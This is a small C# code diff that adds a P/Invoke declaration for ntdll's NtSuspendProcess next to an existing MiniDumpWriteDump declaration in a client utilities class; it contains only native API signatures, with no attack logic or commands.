@@ -221,5 +221,8 @@ namespace Pulsar.Client.Utilities
         [DllImport("DbgHelp.dll", SetLastError = true)]
         internal static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, MiniDumpType DumpType,
             IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtSuspendProcess(IntPtr processHandle);
     }
 }
